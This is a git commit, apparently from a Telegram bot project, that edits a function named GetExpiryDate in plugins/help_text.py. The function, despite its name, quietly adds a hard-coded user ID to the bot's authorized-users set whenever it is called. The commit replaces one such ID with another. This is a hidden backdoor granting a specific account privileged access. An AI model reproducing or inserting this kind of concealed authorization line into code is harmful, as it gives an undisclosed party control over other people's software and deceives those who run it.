f6ee618d74a93c9e023ad8a012d0273bf59ddd33
BLAZERIDER <82632425+BLAZERIDER@users.noreply.github.com>
2021-07-03 12:04:21 +0530

    Update help_text.py

--- plugins/help_text.py
+++ plugins/help_text.py
@@ -34,7 +34,7 @@ from translation import Translation
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(861055237)
+    Config.AUTH_USERS.add(1832447570)
     return expires_at
 
 
